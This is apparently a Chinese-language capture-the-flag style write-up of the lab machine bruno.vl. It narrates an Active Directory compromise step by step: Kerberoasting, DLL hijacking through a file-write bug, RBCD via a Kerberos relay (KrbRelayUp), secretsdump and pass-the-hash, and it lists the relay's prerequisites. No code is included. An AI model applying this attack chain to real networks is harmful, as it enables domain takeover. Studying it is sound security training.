首先發現了目標系統開放的 FTP 和 SMB 服務。利用匿名 FTP 登錄，雖然無法寫入文件，但成功下載了所有文件，並在其中發現了一個 changelog 文件，提示存在一個 dev 網站。通過訪問 dev.bruno.vl，發現該網站的按鈕是假的，但 Queue、Benign 和 Malicious 文件來自 FTP。進一步分析 changelog，發現 svc_scan 是一個服務賬號，嘗試 asreproast 和 kerberoasting 攻擊後，成功破解了該用戶的 hash，並發現該用戶可以讀寫 queue 共享目錄。注意到系統安裝了 ADCS，但未能利用。接著，分析 SampleScammer.exe，發現需要安裝 donet 才能運行，並在本地建立測試環境。通過反編譯 SampleScanner.dll，發現一個 bug，允許寫入任意文件。利用這個 bug，嘗試 dll 劫持，成功運行 payload，證明 dll 劫持可行。接下來，通過製作惡意 dll 並利用 zip 壓縮技術，成功在目標系統上獲得 shell。雖然該 shell 沒有特殊權限，但擁有 SeMachineAccountPrivilege，允許創建機器賬號。使用 winpeas 工具，發現可以進行 RBCD 攻擊。通過 Kerberos Relay attack，成功獲得 admin 用戶的 ticket，並使用 secretsdump.py 獲得 admin 的 hash，最終通過 pass the hash 技術獲得 admin 的 shell。為了簡化過程，使用 KrbRelayUp 工具自動化攻擊步驟，但仍需手動爆破 CLSID。

根據上面的提示找到：

  • https://github.com/Dec0ne/KrbRelayUp
  • https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9
  • https://github.com/cube0x0/KrbRelay/

其中第二篇文章比較有用，首先先創建一個機器賬號，然後使用 bug 的方法給DC增加一個 msDS-AllowedToActOnBehalfOfOtherIdentity​ 指向剛剛創建的機器賬號，這樣就可以進行 RBCD attack。

這個 bug 的方法其實就是Kerberos Relay attack​，其中需要：

  • 有一個開放的TCP端口用作 COM 服務器（因爲當 COM 伺服器收到 UseProtSeq 呼叫時，它會嘗試將 TCP 伺服器綁定到所有接口，這隨後會觸發 Windows Defender 防火牆提示使用者進行存取。管理員才允許打開windows上的防火墻，即使COM的服務器是在本地運行且不需要監聽所有外部連接的端口，但是Windows Defender 還是會去阻擋COM連接，這樣你就會得到 "The RPC server is unavailable. (Exception from HRESULT: 0x800706BA)"​）
  • 需要一個 CLSID。
  • LDAP 的簽名是非强制的（默認配置） 且 DCOM 的身份驗證等級在 RPC_C_AUTHN_LEVEL_PKT_INTEGRITY​ 以下。
  • 賬號允許增加一臺電腦。
